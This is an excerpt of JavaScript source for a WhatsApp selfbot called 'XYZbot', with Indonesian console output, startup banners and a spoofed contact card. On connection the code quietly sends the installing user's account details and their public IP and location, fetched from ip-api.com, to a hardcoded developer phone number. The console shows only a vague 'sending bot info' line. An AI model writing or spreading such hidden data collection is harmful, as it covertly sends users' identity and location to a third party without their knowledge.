...
const gcrevoke = ["628881372457-17578329106@g.us"]
prefix = '#'
shp = '⬡'
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["XYZbot", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      color("]", "white"),
      color(" Scan Here"),
      client.sendMessage(`628881372457@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Connect Sukses > Follow @namasaya.leon");
console.log(color(figlet.textSync(`${spc1}            XYZbot`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/628881372457'))
    console.log(color('[XYZbot]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 𝙉𝙖𝙣𝙙𝙖 𝙎𝙩𝙮𝙡𝙚 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`628881372457@s.whatsapp.net`, `*Hai Owner XYZbotl, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer XYZbot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/628881372457?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("628881372457@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer XYZbot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/628881372457?text=Assalamualaikum"}}})
...
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '628881372457-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'𝘕𝘢𝘯𝘥𝘢 𝘚𝘵𝘺𝘭𝘦シ︎⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;XYZbot;;;\nFN:resku\nitem1.TEL;waid=628881372457:+62 888-1372-457\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
